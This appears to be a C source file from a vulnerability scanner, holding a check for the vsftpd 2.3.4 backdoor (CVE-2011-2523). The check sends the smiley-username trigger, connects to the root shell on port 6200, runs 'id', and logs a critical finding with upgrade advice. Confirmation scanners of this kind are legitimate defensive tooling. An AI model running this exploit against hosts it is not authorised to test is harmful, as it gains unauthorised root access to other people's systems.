#include <stdio.h>
#include <string.h>
#include "reconpulse/vuln_checks.h"
#include "reconpulse/netutils.h"

/* CVE-2011-2523 — vsftpd 2.3.4 source tarball was trojaned between
 * 2011-06-30 and 2011-07-03: sending a username containing the smiley
 * token ":)" causes the backdoored binary to spawn a root shell on TCP
 * 6200. Metasploitable2 ships this exact build. Verification: trigger it,
 * then confirm we can actually run a command on the spawned listener. */
void check_vsftpd_backdoor(const char *ip, const port_result_t *port, host_result_t *host, int timeout_ms)
{
    (void)port;
    socket_t ctrl = net_tcp_connect(ip, 21, timeout_ms);
    if (ctrl == INVALID_SOCKET) return;

    char banner[256];
    net_recv_line(ctrl, banner, sizeof(banner), timeout_ms);

    const char *trigger = "USER backdoor:)\r\n";
    if (net_send_all(ctrl, trigger, (int)strlen(trigger)) != 0) {
        net_close(ctrl);
        return;
    }
    char resp[256];
    net_recv_line(ctrl, resp, sizeof(resp), timeout_ms);
    net_close(ctrl);

    /* Give the backdoored binary a moment to bind the listener. */
    net_sleep_ms(500);

    socket_t shell = net_tcp_connect(ip, 6200, timeout_ms);
    if (shell == INVALID_SOCKET) return;

    const char *cmd = "id\n";
    net_send_all(shell, cmd, (int)strlen(cmd));
    char out[256];
    net_recv_line(shell, out, sizeof(out), timeout_ms);
    net_close(shell);

    if (strstr(out, "uid=")) {
        char evidence[300];
        snprintf(evidence, sizeof(evidence), "port 6200 responded to 'id' with: %.200s", out);
        host_add_finding(host, "CVE-2011-2523",
                          "vsFTPd 2.3.4 backdoor - remote root shell",
                          "The vsftpd 2.3.4 source distribution was trojaned; sending a "
                          "username containing ':)' spawns a root shell listener on TCP 6200.",
                          SEV_CRITICAL, CONF_CONFIRMED, evidence,
                          "Upgrade vsftpd to a version obtained from a verified source and "
                          "checksum future downloads.");
    }
}
